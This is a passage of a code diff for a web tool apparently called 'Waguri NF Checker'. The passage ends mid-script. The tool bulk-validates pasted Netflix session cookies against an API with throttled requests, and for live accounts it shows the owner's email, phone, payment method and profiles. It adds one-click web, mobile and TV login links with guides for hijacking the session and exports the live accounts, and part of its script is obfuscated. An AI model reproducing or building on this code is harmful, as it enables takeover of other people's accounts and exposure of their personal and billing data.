+                    <div style="color: var(--res-accent); font-weight: 700; font-size: 12px; letter-spacing: 1px;">
+                        <i class="fas fa-circle mr-1" style="font-size: 8px; vertical-align: middle;"></i> ACTIVE
+                    </div>
+                </div>
+                <div class="card-body-pad">
+                    <div class="mb-4 pb-2 border-bottom" style="border-color: rgba(255,255,255,0.05) !important;">
+                        <div class="field-label">EMAIL IDENTITY</div>
+                        <div class="field-value email-value">${data.x_mail || 'Valid Account'}</div>
+                    </div>
+                    
+                    <div class="row mb-4">
+                        <div class="col-6">
+                            <div class="field-label">PLAN</div>
+                            <div class="field-value" style="color: ${premiumColor};">${planStr}</div>
+                        </div>
+                        <div class="col-6 text-right">
+                            <div class="field-label">COUNTRY</div>
+                            <div class="field-value">${locStr}</div>
+                        </div>
+                    </div>
+
+                    <div class="row mb-4">
+                        <div class="col-6">
+                            <div class="field-label">PHONE</div>
+                            <div class="field-value">${data.x_tel || 'N/A'}</div>
+                        </div>
+                        <div class="col-6 text-right">
+                            <div class="field-label">PAYMENT</div>
+                            <div class="field-value">${data.x_bil || 'N/A'}</div>
+                        </div>
+                    </div>
+
+                    <div class="row mb-4">
+                        <div class="col-6">
+                            <div class="field-label">MEMBER SINCE</div>
+                            <div class="field-value">${data.x_mem || 'N/A'}</div>
+                        </div>
+                        <div class="col-6 text-right">
+                            <div class="field-label">RENEWAL DATE</div>
+                            <div class="field-value">${data.x_ren || 'N/A'}</div>
+                        </div>
+                    </div>
+
+                    <div class="mb-4">
+                        <div class="field-label">PROFILES</div>
+                        <div class="field-value" style="font-size: 14px; line-height: 1.5;">${data.x_usr || 'N/A'}</div>
+                    </div>
+
+                    <div class="action-pill-group">
+                        <a href="${directLink}" target="_blank" class="action-pill"><i class="fas fa-desktop mr-2"></i> Web</a>
+                        <button onclick="openMobileGuide('${mobileLink}')" class="action-pill"><i class="fas fa-mobile-alt mr-2"></i> Mobile</button>
+                        <button onclick="openTvGuide('${tvLink}')" class="action-pill"><i class="fas fa-tv mr-2"></i> TV</button>
+                        
+                        <button onclick="copyCardDetails('${base64EncodedDetail}')" class="action-pill full-width"><i class="fas fa-copy mr-2"></i> Copy Details</button>
+                    </div>
+                </div>
+            </div>`;
+        } 
+        
+        if (mode === 'bulk') return '';
+
+        if (data.status === 'ERROR' && httpStatus === 429) {
+            return `
+            <div class="result-item d-flex align-items-center fade-in" style="border: 1px solid var(--border-color); background: rgba(255,255,255,0.02); padding: 20px; border-radius: 12px; margin-bottom: 10px;">
+                <span class="status-badge status-warning mr-3"><i class="fas fa-exclamation-triangle mr-1"></i> RATE LIMIT</span>
+                <span style="color: var(--text-muted); font-size: 13px;">${data.message}</span>
+            </div>`;
+        } else {
+            return `
+            <div class="result-item d-flex align-items-center fade-in" style="border: 1px solid var(--border-color); background: rgba(255,255,255,0.02); padding: 20px; border-radius: 12px; margin-bottom: 10px;">
+                <span class="status-badge status-error mr-3"><i class="fas fa-times mr-1"></i> INVALID</span>
+                <span style="color: var(--text-muted); font-size: 13px;">Cookie Expired or Invalid</span>
+            </div>`;
+        }
+    }
+
+    // --- Single Check Execution ---
+    async function processSingle() {
+        const rawText = $('#singleInput').val().trim();
+        if (!rawText) return alert("Please enter a cookie string first.");
+
+        const cookies = parseMixedInput(rawText);
+        const cookieToTest = cookies.length > 0 ? cookies[0] : rawText;
+
+        const btn = $('#startSingleBtn');
+        const originalHtml = btn.html();
+        
+        btn.prop('disabled', true).html('<div class="loader"></div> CHECKING...');
+        
+        $('#resultsCard').show();
+        $('#resultsHeader').removeClass('d-flex').hide(); 
+        $('#bulkStats').removeClass('d-flex').hide();
+        $('#bulkDownloadWrapper').hide();
+        
+        $('#singleResultsList').show();
+        $('#carouselWrapper, #carouselIndicator').hide();
+        
+        $('#singleResultsList').html(`
+            <div class="text-center py-5 fade-in">
+                <div class="loader" style="width: 40px; height: 40px; border-width: 4px; border-top-color: #f43f5e;"></div>
+                <div class="mt-3" style="color: var(--text-muted); font-size: 14px; font-weight: 600; letter-spacing: 1px; text-transform: uppercase;">Authenticating...</div>
+            </div>
+        `);
+        
+        try {
+            const response = await fetch(apiUrl, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ cookie: cookieToTest })
+            });
+
+            const rawResponseText = await response.text();
+            let data = JSON.parse(rawResponseText);
+            
+            const resultHtml = createResultElement(data, response.status, 'single', 1, cookieToTest);
+            $('#singleResultsList').html(resultHtml);
+            
+            $('#singleInput').val('');
+
+        } catch (error) {
+            $('#singleResultsList').html(`
+                <div class="result-item d-flex align-items-center fade-in" style="border: 1px solid var(--border-color); background: rgba(255,255,255,0.02); padding: 20px; border-radius: 12px; margin-bottom: 10px;">
+                    <span class="status-badge status-error mr-3">SYSTEM ERROR</span>
+                    <span style="color: var(--text-muted); font-size: 13px;">Failed to connect to API.</span>
+                </div>
+            `);
+            // Show SweetAlert for Single Check Error
+            Swal.fire({
+                title: 'Notice',
+                text: 'System having trouble, please comeback again later.',
+                icon: 'error',
+                background: '#121214',
+                color: '#f8fafc',
+                confirmButtonColor: '#f43f5e'
+            });
+        } finally {
+            btn.prop('disabled', false).html(originalHtml);
+        }
+    }
+
+    // --- Bulk Check Execution ---
+    async function processBulk() {
+        const rawText = $('#bulkInput').val().trim();
+        if (!rawText) return alert("Please paste some cookies first!");
+
+        const cookies = parseMixedInput(rawText);
+        if (cookies.length === 0) return alert("No valid cookies found to process.");
+
+        const btn = $('#startBulkBtn');
+        btn.prop('disabled', true).html('<div class="loader"></div> PROCESSING BULK...');
+        
+        $('#resultsCard').show();
+        $('#resultsHeader').addClass('d-flex').show(); 
+        $('#bulkStats').addClass('d-flex').show(); 
+        $('#bulkDownloadWrapper').hide();
+        
+        $('#singleResultsList').hide();
+        $('#bulkResultsList').empty();
+
+        currentActiveIndex = 0;
+        totalActiveCards = 0;
+        bulkLiveAccounts = []; // Clear array for a fresh run
+        updateCarouselUI();
+        
+        let deadCount = 0;
+        let limitCount = 0;
+        let apiErrorShown = false; // Flag to track if API went down
+        let processWasAborted = false;
+        
+        $('#statActive').text(totalActiveCards);
+        $('#statDead').text(deadCount);
+        $('#statLimit').text(limitCount);
+
+        $('#progressText').html(`<div class="loader" style="width:14px; height:14px; border-width:2px; border-top-color: #f43f5e;"></div> <span style="color:#f8fafc; font-weight: 600;">Processing...</span>`);
+
+        for (let i = 0; i < cookies.length; i++) {
+            try {
+                const response = await fetch(apiUrl, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ cookie: cookies[i] })
+                });
+
+                const rawResponseText = await response.text();
+                let data = JSON.parse(rawResponseText);
+                
+                if (data.status === 'SUCCESS') {
+                    totalActiveCards++;
+                    $('#statActive').text(totalActiveCards);
+                    
+                    // Capture full detailed text for the download array (passing the original cookie)
+                    const detailsStr = formatDetailsText(data, cookies[i]);
+                    bulkLiveAccounts.push(detailsStr);
+                    
+                    // Add Card to Carousel
+                    let isActiveClass = (totalActiveCards === 1) ? 'active' : '';
+                    let resultHtml = createResultElement(data, response.status, 'bulk', totalActiveCards, cookies[i]);
+                    
+                    $('#bulkResultsList').append(`<div class="carousel-card ${isActiveClass}">${resultHtml}</div>`);
+                    updateCarouselUI();
+                    
+                } else if (data.status === 'ERROR' && response.status === 429) {
+                    limitCount++;
+                    $('#statLimit').text(limitCount);
+                } else {
+                    deadCount++;
+                    $('#statDead').text(deadCount);
+                }
+
+            } catch (error) {
+                // If the fetch fails entirely (API down, network out), abort the process
+                if (!apiErrorShown) {
+                    Swal.fire({
+                        title: 'Notice',
+                        text: 'System having trouble, please comeback again later.',
+                        icon: 'error',
+                        background: '#121214',
+                        color: '#f8fafc',
+                        confirmButtonColor: '#f43f5e'
+                    });
+                    apiErrorShown = true;
+                }
+                processWasAborted = true;
+                break; // <-- This instantly STOPS the bulk check loop
+            }
+
+            if (i < cookies.length - 1) {
+                await sleep(2000); 
             }
         }
-        // ------------------------------------------------
 
-        http_response_code($http_code);
-        header('Content-Type: application/json');
-        echo $response;
-        exit;
+        // Update progress text based on whether it finished successfully or was aborted
+        if (processWasAborted) {
+            $('#progressText').html(`<i class="fas fa-exclamation-triangle text-[#fbbf24] mr-1"></i> Aborted early due to API issue.`);
+        } else {
+            $('#progressText').html(`<i class="fas fa-check-circle text-[#34d399] mr-1"></i> Finished! Processed ${cookies.length} total.`);
+        }
+        
+        btn.prop('disabled', false).html('<i class="fas fa-layer-group mr-2"></i> START BULK CHECK');
+        
+        $('#bulkInput').val('');
+        
+        // Show Download button if we found live accounts
+        if (bulkLiveAccounts.length > 0) {
+            $('#bulkDownloadWrapper').show().addClass('fade-in');
+        }
     }
-}
-?>
-<!doctypehtml><html lang=en><meta charset=UTF-8><meta content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"name=viewport><title>Waguri NF Checker | Premium</title><link href=waguri1.png rel=icon type=image/png><script src=https://cdn.tailwindcss.com></script><link href=https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.1.3/css/bootstrap.min.css rel=stylesheet><link href=https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css rel=stylesheet><style>@import url(https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap);:root{--bg-color:#09090b;--card-bg:#121214;--border-color:rgba(255, 255, 255, 0.08);--text-main:#f8fafc;--text-muted:#a1a1aa;--accent-gradient:linear-gradient(135deg, #f43f5e, #8b5cf6);--accent-glow:rgba(244, 63, 94, 0.4);--res-card-bg:rgba(255, 255, 255, 0.02);--res-border:rgba(255, 255, 255, 0.08);--res-accent:#f43f5e}body{background:var(--bg-color);color:var(--text-main);font-family:Inter,sans-serif;padding-top:120px;background-image:radial-gradient(circle at 50% 0,rgba(139,92,246,.1) 0,transparent 50%);background-repeat:no-repeat;min-height:100vh}.navbar-custom{background:rgba(18,18,20,.7);border-bottom:1px solid var(--border-color);backdrop-filter:blur(12px);padding:16px 0;position:fixed;top:0;left:0;width:100%;z-index:999}.card-premium{background:var(--card-bg);border:1px solid var(--border-color);border-radius:20px;box-shadow:0 20px 40px rgba(0,0,0,.5),inset 0 1px 0 rgba(255,255,255,.05);backdrop-filter:blur(10px)}.title-gradient{background:var(--accent-gradient);-webkit-background-clip:text;-webkit-text-fill-color:transparent;font-weight:800;letter-spacing:-1px}input.form-control,textarea.form-control{background:rgba(0,0,0,.4);border:1px solid var(--border-color);color:var(--text-main);border-radius:12px;padding:15px;font-size:14px;transition:all .3s cubic-bezier(.4, 0, .2, 1)}input.form-control:focus,textarea.form-control:focus{background:rgba(0,0,0,.6);border-color:#8b5cf6;box-shadow:0 0 0 4px rgba(139,92,246,.15);outline:0;color:var(--text-main)}input.form-control::placeholder,textarea.form-control::placeholder{color:#52525b}.btn-start{background:var(--accent-gradient);border:none;color:#fff;border-radius:12px;font-weight:600;text-transform:uppercase;letter-spacing:1px;font-size:14px;transition:all .3s ease;position:relative;overflow:hidden;z-index:1}.btn-start::before{content:'';position:absolute;top:0;left:0;width:100%;height:100%;background:linear-gradient(135deg,#8b5cf6,#f43f5e);z-index:-1;transition:opacity .3s ease;opacity:0}.btn-start:hover::before{opacity:1}.btn-start:hover{transform:translateY(-2px);box-shadow:0 8px 20px var(--accent-glow);color:#fff}.mode-switcher{background:rgba(0,0,0,.4);border:1px solid rgba(255,255,255,.08);border-radius:12px;padding:6px;display:inline-flex;margin-bottom:30px;box-shadow:inset 0 2px 4px rgba(0,0,0,.3)}.mode-btn{background:0 0;color:var(--text-muted);border:none;padding:12px 35px;border-radius:8px;font-weight:600;font-size:14px;transition:all .3s cubic-bezier(.4, 0, .2, 1);cursor:pointer;position:relative}.mode-btn:hover:not(.active){color:#fff;background:rgba(255,255,255,.03)}.mode-btn.active{background:var(--accent-gradient);color:#fff;box-shadow:0 4px 15px rgba(244,63,94,.3)}.stat-num{font-size:36px;font-weight:700}.stat-label{font-size:11px;text-transform:uppercase;color:var(--text-muted);letter-spacing:1.5px;font-weight:700}.premium-ui-card{border:1px solid var(--res-border);border-radius:16px;background:var(--res-card-bg);overflow:hidden;width:100%}.card-head{border-bottom:1px solid var(--res-border);padding:18px 24px;background:rgba(255,255,255,.01)}.card-body-pad{padding:24px 24px 30px 24px}.field-label{font-size:10px;color:var(--text-muted);font-weight:700;letter-spacing:1.5px;text-transform:uppercase;margin-bottom:6px}.field-value{font-size:15px;color:var(--text-main);font-weight:600}.email-value{font-size:22px;font-weight:700;word-break:break-all;letter-spacing:.5px}.action-pill-group{display:flex;margin-top:1.5rem;gap:12px}.action-pill{flex:1 1 0;text-align:center;border:1px solid var(--res-border);color:var(--text-main);padding:12px 0;border-radius:12px;font-size:13px;font-weight:600;letter-spacing:.5px;text-decoration:none;transition:.2s;background:rgba(255,255,255,.01);cursor:pointer;display:inline-block}.action-pill:hover{background:rgba(244,63,94,.1);color:#f43f5e;border-color:#f43f5e;text-decoration:none;box-shadow:0 4px 12px rgba(244,63,94,.2)}.carousel-wrapper{display:flex;align-items:center;justify-content:center;gap:20px;position:relative;padding:10px 0}.carousel-viewport{flex-grow:1;overflow:hidden;position:relative}.carousel-card{display:none;width:100%;animation:fadeScale .3s ease-in-out forwards}.carousel-card.active{display:block}@keyframes fadeScale{from{opacity:0;transform:scale(.98)}to{opacity:1;transform:scale(1)}}.nav-btn-icon{background:rgba(255,255,255,.05);border:1px solid var(--res-border);color:var(--text-muted);width:44px;height:44px;border-radius:50%;display:inline-flex;align-items:center;justify-content:center;transition:.2s;cursor:pointer;font-size:16px;flex-shrink:0}.nav-btn-icon:hover:not(:disabled){color:#f43f5e;background:rgba(244,63,94,.15);border-color:#f43f5e;box-shadow:0 4px 12px rgba(244,63,94,.3)}.nav-btn-icon:disabled{opacity:.3;cursor:not-allowed}.carousel-indicator{text-align:center;color:var(--text-muted);font-size:14px;font-weight:600;margin-top:20px;letter-spacing:.5px}.status-badge{font-size:10px;padding:6px 12px;border-radius:8px;font-weight:700;letter-spacing:.5px;text-transform:uppercase}.status-error{background:rgba(239,68,68,.1);color:#f87171;border:1px solid rgba(239,68,68,.2)}.status-warning{background:rgba(245,158,11,.1);color:#fbbf24;border:1px solid rgba(245,158,11,.2)}.fade-in{animation:fadeIn .5s cubic-bezier(.16,1,.3,1) forwards}@keyframes fadeIn{from{opacity:0;transform:translateY(15px)}to{opacity:1;transform:translateY(0)}}.loader{border:3px solid rgba(255,255,255,.1);border-top:3px solid #f43f5e;border-radius:50%;width:20px;height:20px;animation:spin 1s linear infinite;display:inline-block;vertical-align:middle;margin-right:8px}@keyframes spin{0%{transform:rotate(0)}100%{transform:rotate(360deg)}}.modal-backdrop{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,.7);backdrop-filter:blur(5px);z-index:1050;display:flex;align-items:center;justify-content:center}.modal-content{background:var(--card-bg);border:1px solid var(--border-color);border-radius:16px;padding:24px;width:90%;max-width:420px;box-shadow:0 20px 40px rgba(0,0,0,.5)}@media (max-width:768px){body{padding-top:115px}.navbar-custom h1{font-size:1.2rem!important}.card-premium{padding:20px!important}.title-gradient{font-size:2.2rem!important}#bulkInput{height:200px}.stat-num{font-size:28px}.stat-label{font-size:9px;letter-spacing:1px}.card-body-pad{padding:20px 16px 24px 16px}.email-value{font-size:18px}.field-value{font-size:13px}.field-label{font-size:9px}.action-pill{font-size:11px;padding:10px 0}.action-pill-group{gap:8px}.carousel-wrapper{gap:10px}.nav-btn-icon{width:36px;height:36px;font-size:14px}}@media (max-width:480px){.mode-switcher{display:flex;width:100%}.mode-btn{flex:1;padding:10px 0;font-size:13px}#bulkStats{flex-wrap:wrap;gap:15px}#bulkStats>div{flex:1 1 30%}.action-pill-group{flex-direction:column;gap:10px}.action-pill{width:100%}}</style><nav class=navbar-custom><div class="d-flex align-items-center justify-content-between container"><div class="d-flex align-items-center"><img alt="Waguri Logo"class=mr-3 src=waguri1.png style=width:56px;height:56px;object-fit:contain;border-radius:12px><h1 class="title-gradient m-0"style=font-size:1.5rem;letter-spacing:0>Waguri NF Checker</h1></div><div class="text-muted d-none d-sm-block"style=font-size:.9rem;font-weight:500;letter-spacing:.5px>Secure & Premium Token Auth</div></div></nav><div class=modal-backdrop style=display:none id=formatModal><div class="fade-in modal-content"><div class="d-flex align-items-center justify-content-between mb-3"><h5 class="font-weight-bold text-white m-0"><i class="fas mr-2 text-[#f43f5e] fa-exclamation-circle"></i> Requirement Notice</h5><button class="text-muted bg-transparent border-0"onclick=closeModal() style=cursor:pointer;font-size:1.2rem><i class="fas fa-times"></i></button></div><p style=color:var(--text-muted);font-size:14px;line-height:1.6>Requires <strong class=text-white>SecureNetflixId</strong> and <strong class=text-white>NetflixId</strong>. To guarantee accurate cookie validation, please confirm that your session data contains both fields.</p><button class="btn btn-start w-100 mt-3 py-2"onclick=closeModal()>Understood</button></div></div><div class=modal-backdrop style=display:none id=mobileGuideModal><div class="fade-in modal-content"style=max-width:500px><div class="d-flex align-items-center justify-content-between mb-4"><h5 class="font-weight-bold text-white m-0"><i class="fas mr-2 text-[#f43f5e] fa-mobile-alt"></i> Watch on Mobile Guide</h5><button class="text-muted bg-transparent border-0"onclick=closeMobileGuide() style=cursor:pointer;font-size:1.2rem><i class="fas fa-times"></i></button></div><div style=color:var(--text-muted);font-size:13px;line-height:1.6;max-height:60vh;overflow-y:auto;padding-right:5px><p class="font-weight-bold text-white mb-3"style=font-size:14px>To Watch on Mobile App is 50/50 but there still a chance! This method works for some devices, just try and try!<ol class="mb-4 pl-3"style=list-style-type:decimal><li class=mb-2>Open Netflix App (Make sure it's <strong>Clear Data</strong>). Leave it open.<li class=mb-2>Make sure you're using our website in <strong>Chrome</strong> (Better chances based on some users).<li class=mb-2>Now click the "<strong>WATCH ON MOBILE</strong>" button below.<li class=mb-2>If an 'Open App' prompt shows in the browser, click it and it will direct to the Netflix app.</ol><div class="mb-3 p-3"style="background:rgba(244,63,94,.05);border-left:3px solid #f43f5e;border-radius:0 8px 8px 0"><p class="font-weight-bold mb-1 text-[#f43f5e]"style=font-size:14px>If this didn't work:<p class="mb-0 text-gray-300">Click the <strong>Web Button</strong> first. It will direct to a new tab. Now go back to the Checker again and click the Watch on Mobile again. Some say this works. Just try and try. This is depending on Device and Browsers.</div></div><a class="btn btn-start w-100 py-3 mt-2 text-center"href=# id=actualMobileLink style=display:block;text-decoration:none target=_blank><i class="fas mr-2 fa-external-link-alt"></i> WATCH ON MOBILE</a></div></div><div class=modal-backdrop style=display:none id=tvGuideModal><div class="fade-in modal-content"style=max-width:500px><div class="d-flex align-items-center justify-content-between mb-3"><h5 class="font-weight-bold text-white m-0"><i class="fas mr-2 text-[#f43f5e] fa-tv"></i> Watch on TV Guide</h5><button class="text-muted bg-transparent border-0"onclick=closeTvGuide() style=cursor:pointer;font-size:1.2rem><i class="fas fa-times"></i></button></div><div style=color:var(--text-muted);font-size:13px;line-height:1.6;max-height:60vh;overflow-y:auto;padding-right:5px><div class="d-flex align-items-center mb-4 gap-2"><input class=form-control id=tvLinkInput readonly style=flex:1;margin-bottom:0;padding:12px;font-size:12px;background:rgba(0,0,0,.5)> <button class="btn btn-start py-2 px-3"onclick=copyTvLink() style=margin-bottom:0;min-width:80px><i class="fas fa-copy"></i> Copy</button></div><p class="font-weight-bold text-white mb-4"style=font-size:14px>To watch Netflix on your TV is high chance especially if you have a PC or a Laptop.<div class=mb-4><p class="font-weight-bold mb-1 text-[#f43f5e]"style=font-size:14px>Option 1 (PC/Laptop)<p class="mb-0 text-gray-300">If you have a PC/Laptop, kindly click the <strong>Web</strong> button first. After it directly logs you in, copy the highlighted link from this modal or press Copy, paste it into your browser's address bar, and enter the code shown on your TV.</div><div class=mb-2><p class="font-weight-bold mb-1 text-[#f43f5e]"style=font-size:14px>Option 2 (Mobile)<p class="mb-0 text-gray-300">If you only have mobile, kindly click the <strong>Mobile Guide</strong> button. After it directly logs you into the Netflix application, simply scan the QR code displayed on your Netflix TV screen using your device.</div></div></div></div><div class="container pb-5"><div class="justify-content-center row"><div class="col-lg-9 col-md-10"><div class="mb-4 card-premium p-4 p-md-5 relative z-10"id=inputContainer><div class=text-center><div class=mode-switcher><button class="mode-btn active"onclick='switchTab("single")'id=btnTabSingle>Single Check</button> <button class=mode-btn onclick='switchTab("bulk")'id=btnTabBulk>Bulk Check</button></div></div><div class=fade-in id=sectSingle><label class="font-weight-bold text-white mb-2"style=font-size:14px>Input Single Token/Cookie</label> <textarea class="mb-4 form-control"id=singleInput placeholder="Paste single Netscape block, JSON, or NetflixId here..."rows=4 style=resize:none;overflow-y:auto></textarea> <button class="btn btn-start w-100 py-3"onclick=processSingle() id=startSingleBtn><i class="fas mr-2 fa-bolt"></i> CHECK ACCOUNT</button></div><div style=display:none id=sectBulk><div class="d-flex justify-content-between align-items-end mb-2"><label class="font-weight-bold text-white mb-0"style=font-size:14px>Paste Bulk Cookies</label> <span style=font-size:12px;color:#f43f5e;cursor:pointer;transition:.2s onclick=openModal()><i class="fas fa-info-circle"></i> Supported Formats</span></div><p class=mb-3 style=font-size:12px;color:var(--text-muted)>Paste one cookie per line or use universal separator ( | ). Netscape and JSON blocks are automatically parsed.</p><textarea class="mb-4 form-control"id=bulkInput placeholder="Format: NetflixId=... | SecureNetflixId=...
-Or paste full JSON/Netscape formats..."rows=12 style=resize:none;overflow-y:auto></textarea> <button class="btn btn-start w-100 py-3"onclick=processBulk() id=startBulkBtn><i class="fas mr-2 fa-layer-group"></i> START BULK CHECK</button></div></div><div class="card-premium p-4 p-md-5"style=display:none id=resultsCard><div class="d-flex align-items-center justify-content-between mb-4 pb-3"style="border-bottom:1px solid var(--border-color)"id=resultsHeader><h5 class="font-weight-bold text-white m-0"><i class="fas mr-2 text-[#f43f5e] fa-satellite-dish"></i> Live Results</h5><span style=color:var(--text-muted);font-size:13px;font-weight:500 id=progressText>Awaiting...</span></div><div class="d-flex justify-content-around mb-5 pb-4"style="border-bottom:1px solid var(--border-color);display:none"id=bulkStats><div class=text-center><div class=stat-num style=color:#34d399 id=statActive>0</div><div class=stat-label>Active</div></div><div class=text-center><div class=stat-num style=color:#f87171 id=statDead>0</div><div class=stat-label>Invalid / Dead</div></div><div class=text-center><div class=stat-num style=color:#fbbf24 id=statLimit>0</div><div class=stat-label>Rate Limited</div></div></div><div id=singleResultsList></div><div class=carousel-wrapper style=display:none id=carouselWrapper><button class=nav-btn-icon onclick=navCarousel(-1) id=btnPrev><i class="fas fa-chevron-left"></i></button><div class=carousel-viewport><div id=bulkResultsList></div></div><button class=nav-btn-icon onclick=navCarousel(1) id=btnNext><i class="fas fa-chevron-right"></i></button></div><div class=carousel-indicator style=display:none id=carouselIndicator>0 of 0 Active Accounts</div></div></div></div></div><script src=https://code.jquery.com/jquery-3.6.0.min.js></script><script>const m=a;function openModal(){const e=a;$(e(241))[e(206)](e(181),e(236))}function closeModal(){const e=a;$(e(241))[e(151)]()}function openMobileGuide(e){const t=a;$("#actualMobileLink")[t(152)](t(260),e),$(t(244))[t(206)](t(181),"flex")}function closeMobileGuide(){const e=a;$(e(244))[e(151)]()}function openTvGuide(e){const t=a;$(t(238))[t(204)](e),$(t(237)).css(t(181),"flex")}function closeTvGuide(){const e=a;$(e(237))[e(151)]()}function copyTvLink(){const t=a,e=$(t(238))[t(204)]();navigator.clipboard[t(139)](e)[t(232)](()=>{const e=t;alert(e(253))})[t(249)](e=>{alert("Failed to copy TV link: "+e)})}function P(){const e=['\n            <div class="result-item d-flex align-items-center fade-in" style="border: 1px solid var(--border-color); background: rgba(255,255,255,0.02); padding: 20px; border-radius: 12px; margin-bottom: 10px;">\n                <span class="status-badge status-error mr-3"><i class="fas fa-times mr-1"></i> INVALID</span>\n                <span style="color: var(--text-muted); font-size: 13px;">Cookie Expired or Invalid</span>\n            </div>',"disabled",'<div class="carousel-card ',"join","242NDDyQp",'<div class="loader"></div> PROCESSING BULK...',"Please enter a cookie string first.","3547935TrIiOv","#startBulkBtn","display",'<i class="fas fa-layer-group mr-2"></i> START BULK CHECK',"html",'</div>\n                        </div>\n                        <div class="col-6 text-right">\n                            <div class="field-label">PAYMENT</div>\n                            <div class="field-value">',"x_tier","#bulkStats","SecureNetflixId=","substring","Valid Account",'\n            <div class="premium-ui-card mx-auto">\n                <div class="card-head d-flex justify-content-between align-items-center">\n                    ',"parse","x_l2","#f43f5e","#bulkInput","700880OdhaVG","1065216LuraZn","#bulkResultsList .carousel-card","#singleInput","push","66344cbTCpz","active","127ENMIQp","#statLimit","val","replace","css","#bulkResultsList","3194saPeND","ERROR","x_bil","2102224ZIbPxx","#btnNext","FALSE","Please paste some cookies first!","#resultsCard","#resultsHeader","clear","#progressText","empty",'</div>\n                        </div>\n                    </div>\n\n                    <div class="mb-4">\n                        <div class="field-label">PROFILES</div>\n                        <div class="field-value" style="font-size: 14px; line-height: 1.5;">',"SUCCESS","#btnTabBulk","x_mem","append","No valid cookies found to process.",'<div class="loader" style="width:14px; height:14px; border-width:2px; border-top-color: #f43f5e;"></div> <span style="color:#f8fafc; font-weight: 600;">Processing...</span>',"NetflixId=","removeClass",'</div>\n                        </div>\n                        <div class="col-6 text-right">\n                            <div class="field-label">RENEWAL DATE</div>\n                            <div class="field-value">',"POST","16914gqBwOY","then","isArray",'<i class="fas fa-check-circle text-[#34d399] mr-1"></i> Finished! Processed ','\n            <div class="result-item d-flex align-items-center fade-in" style="border: 1px solid var(--border-color); background: rgba(255,255,255,0.02); padding: 20px; border-radius: 12px; margin-bottom: 10px;">\n                <span class="status-badge status-warning mr-3"><i class="fas fa-exclamation-triangle mr-1"></i> RATE LIMIT</span>\n                <span style="color: var(--text-muted); font-size: 13px;">',"flex","#tvGuideModal","#tvLinkInput","x_ren","forEach","#formatModal",'\n                <div class="result-item d-flex align-items-center fade-in" style="border: 1px solid var(--border-color); background: rgba(255,255,255,0.02); padding: 20px; border-radius: 12px; margin-bottom: 10px;">\n                    <span class="status-badge status-error mr-3">SYSTEM ERROR</span>\n                    <span style="color: var(--text-muted); font-size: 13px;">Failed to connect to API.</span>\n                </div>\n            ',"#sectBulk","#mobileGuideModal","</span>\n            </div>","message","trim","</div>","catch","#singleResultsList",'<div class="loader"></div> CHECKING...',"includes","TV Link copied to clipboard!","N/A"," total.",'" target="_blank" class="action-pill"><i class="fas fa-desktop mr-2"></i> Web</a>\n                        <button onclick="openMobileGuide(\'',"x_usr","bulk","<div></div>","href",'\')" class="action-pill"><i class="fas fa-tv mr-2"></i> TV Guide</button>\n                    </div>\n                </div>\n            </div>',"TRUE",'\n                    <div style="color: var(--res-accent); font-weight: 700; font-size: 12px; letter-spacing: 1px;">\n                        <i class="fas fa-circle mr-1" style="font-size: 8px; vertical-align: middle;"></i> ACTIVE\n                    </div>\n                </div>\n                <div class="card-body-pad">\n                    <div class="mb-4 pb-2 border-bottom" style="border-color: rgba(255,255,255,0.05) !important;">\n                        <div class="field-label">EMAIL IDENTITY</div>\n                        <div class="field-value email-value">',"#sectSingle","split","175rGPexg","single","writeText","940JThvNa","status","stringify",'</div>\n                        </div>\n                    </div>\n\n                    <div class="row mb-4">\n                        <div class="col-6">\n                            <div class="field-label">MEMBER SINCE</div>\n                            <div class="field-value">',"location","d-flex","#btnPrev","has","#c084fc","x_tel","#statActive","hide","attr","prop","indexOf","#carouselWrapper, #carouselIndicator","x_loc","text",'\')" class="action-pill"><i class="fas fa-mobile-alt mr-2"></i> Mobile Guide</button>\n                        <button onclick="openTvGuide(\'',"addClass","#startSingleBtn",'<span class="text-white">','</span> of <span class="text-white">',"show","x_l1","length","Unknown","fade-in","application/json","slice","#statDead",'</div>\n                    </div>\n                    \n                    <div class="row mb-4">\n                        <div class="col-6">\n                            <div class="field-label">PLAN</div>\n                            <div class="field-value" style="color: '];return(P=function(){return e})()}!function(){const e=a,t=P();for(;;)try{if(267385==+parseInt(e(202))*(-parseInt(e(208))/2)+parseInt(e(196))/3+parseInt(e(211))/4+parseInt(e(140))/5*(parseInt(e(231))/6)+-parseInt(e(137))/7*(-parseInt(e(200))/8)+parseInt(e(179))/9+parseInt(e(195))/10*(-parseInt(e(176))/11))break;t.push(t.shift())}catch(e){t.push(t.shift())}}();let currentActiveIndex=0,totalActiveCards=0;function navCarousel(e){const t=a,s=$(t(197));0!==s[t(165)]&&($(s[currentActiveIndex])[t(228)]("active"),currentActiveIndex+=e,currentActiveIndex<0&&(currentActiveIndex=0),currentActiveIndex>=totalActiveCards&&(currentActiveIndex=totalActiveCards-1),$(s[currentActiveIndex]).addClass(t(201)),updateCarouselUI())}function updateCarouselUI(){const e=a;0!==totalActiveCards?($("#carouselWrapper, #carouselIndicator")[e(163)](),$("#carouselIndicator")[e(183)](e(161)+(currentActiveIndex+1)+e(162)+totalActiveCards+"</span> Active Accounts"),$(e(146))[e(153)](e(173),0===currentActiveIndex),$(e(212)).prop(e(173),currentActiveIndex>=totalActiveCards-1)):$("#carouselWrapper, #carouselIndicator")[e(151)]()}function switchTab(e){const t=a;$(t(215))[t(151)](),$(t(250))[t(219)](),$(t(207))[t(219)](),$(t(186))[t(228)]("d-flex").hide(),$(t(216))[t(228)](t(145))[t(151)](),$(t(155)).hide(),e===t(138)?($("#btnTabSingle")[t(159)](t(201)),$(t(222))[t(228)](t(201)),$("#sectSingle").show().addClass(t(167)),$(t(243))[t(151)]()[t(228)]("fade-in")):($(t(222))[t(159)]("active"),$("#btnTabSingle").removeClass(t(201)),$(t(243))[t(163)]()[t(159)]("fade-in"),$(t(135))[t(151)]()[t(228)]("fade-in"))}function parseMixedInput(i){const n=a;let l=[],r=0;for(;-1!==(r=i[n(154)]("[",r));){let t=r,s=!1;for(;-1!==(t=i[n(154)]("]",t+1));){let e=i[n(188)](r,t+1);try{var 